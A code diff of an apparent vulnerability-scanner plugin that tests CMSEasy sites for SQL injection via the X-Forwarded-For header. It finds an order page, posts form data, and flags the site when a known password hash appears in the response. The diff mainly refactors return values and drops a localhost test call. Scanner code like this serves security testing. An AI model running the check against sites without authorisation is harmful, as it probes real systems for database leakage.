@@ -18,8 +18,7 @@ def audit(arg):
 		url=orderurl+str(i)
 		code,head,body,errcode,redirect_url=curl.curl(url)
 		if code==200 and '在线支付' in body:
-			goInjection(arg,url)
-			break
+			return goInjection(arg,url)
 
 def goInjection(arg,url):
 	send_data='pnums=1&pname=2221&telphone=2321&address=121211&postcode=1323212&content=1232312&submit=+%E6%8F%90%E4%BA%A4+'
@@ -32,6 +31,7 @@ def goInjection(arg,url):
 		if code1==200 and 'e10adc3949ba59abbe56e057f20f883e' in body1:
 			security_hole('Cmseasy HTTP head(x-forward-for) Sql Injection:'+url)
 
-if __name__ == '__main__':
-	from dummy import *
-	audit(assign('cmseasy', 'http://localhost/cmseasy5_5_20130605/')[1])
+
+			return arg
+if __name__== '__main__':
+    from dummy import *
